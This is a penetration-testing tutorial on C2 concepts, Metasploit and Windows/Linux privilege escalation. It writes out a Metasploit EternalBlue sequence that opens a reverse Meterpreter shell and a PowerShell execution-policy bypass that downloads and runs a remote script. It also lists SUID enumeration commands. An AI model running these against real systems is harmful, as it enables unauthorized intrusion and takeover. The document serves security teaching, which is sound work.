# Exploring Exploitation

## Understand Command and Control (C2) and How It Fits into a Penetration Testerâ€™s Toolkit

Command and Control (C2) is a technique used by attackers to maintain communication with compromised systems. It allows attackers to execute commands, transfer files, and control the target system remotely. C2 is an essential part of a penetration tester's toolkit for post-exploitation activities.

### Key Concepts

- **C2 Server**: The server controlled by the attacker that sends commands to and receives data from compromised systems.
- **Beacon**: A communication mechanism used by compromised systems to check in with the C2 server.
- **Payload**: Malicious code that establishes a connection between the compromised system and the C2 server.

### Example

- **Scenario**: A penetration tester uses a C2 framework to control a compromised system.
  - **C2 Server**: The tester sets up a C2 server to manage compromised systems.
  - **Payload**: The tester delivers a payload to the target system that establishes a connection with the C2 server.
  - **Beacon**: The compromised system periodically checks in with the C2 server, allowing the tester to execute commands and transfer files.

## Use Metasploit to Automate Exploitation Activities

Metasploit is a powerful penetration testing framework that automates the process of exploiting vulnerabilities. It provides a wide range of tools and modules for conducting various exploitation activities.

### Example

- **Basic Exploitation with Metasploit**:
  1. **Start Metasploit**:
     ```bash
     msfconsole
     ```

  2. **Search for an Exploit**:
     ```plaintext
     search ms17_010
     ```

  3. **Select an Exploit Module**:
     ```plaintext
     use exploit/windows/smb/ms17_010_eternalblue
     ```

  4. **Set the Target**:
     ```plaintext
     set RHOSTS 192.0.2.1
     ```

  5. **Set the Payload**:
     ```plaintext
     set payload windows/x64/meterpreter/reverse_tcp
     ```

  6. **Set the LHOST**:
     ```plaintext
     set LHOST 192.0.2.2
     ```

  7. **Run the Exploit**:
     ```plaintext
     exploit
     ```

  - **Explanation**: This sequence of commands uses Metasploit to exploit the MS17-010 vulnerability on a target system with IP address `192.0.2.1`, delivering a Meterpreter payload that provides a reverse shell to the attacker's system with IP address `192.0.2.2`.

## Explain Privilege Escalation and How It Fits into the Attack Cycle

Privilege escalation is the process of gaining higher-level privileges on a compromised system. It is a critical step in the attack cycle, allowing attackers to access sensitive data, execute privileged commands, and maintain persistence.

### Types of Privilege Escalation

- **Vertical Privilege Escalation**: Gaining higher privileges than initially granted, such as moving from a regular user to an administrator.
- **Horizontal Privilege Escalation**: Gaining access to the same level of privileges but for different accounts or resources.

### Example

- **Scenario**: An attacker gains initial access to a system with limited privileges and uses privilege escalation techniques to gain administrative access.
  - **Initial Access**: The attacker exploits a vulnerability to gain access as a regular user.
  - **Privilege Escalation**: The attacker exploits a local vulnerability to elevate privileges to an administrator.

## Perform Basic Privilege-Escalation Tasks

### Example

- **Windows Privilege Escalation**:
  1. **Identify System Information**:
     ```plaintext
     systeminfo
     ```
     - **Explanation**: This command provides information about the operating system, including installed patches and hotfixes.

  2. **Check for Vulnerabilities**:
     ```plaintext
     wmic qfe get Caption,Description,HotFixID,InstalledOn
     ```
     - **Explanation**: This command lists installed patches and hotfixes, which can be cross-referenced with known vulnerabilities.

  3. **Exploit a Vulnerability**:
     - **Example**: Exploiting the MS16-032 vulnerability to gain SYSTEM privileges.
     ```plaintext
     powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/ms16-032.ps1')"
     ```

- **Linux Privilege Escalation**:
  1. **Identify System Information**:
     ```bash
     uname -a
     ```
     - **Explanation**: This command provides information about the kernel version and system architecture.

  2. **Check for SUID Binaries**:
     ```bash
     find / -perm -4000 -type f 2>/dev/null
     ```
     - **Explanation**: This command lists files with the SUID bit set, which can be potential targets for privilege escalation.

  3. **Exploit a SUID Binary**:
     - **Example**: Exploiting a vulnerable SUID binary to gain root access.
     ```bash
     ./vulnerable_suid_binary
     ```

By understanding these concepts and using these tools, you can effectively perform exploitation and privilege escalation activities, enhancing your penetration testing skills.
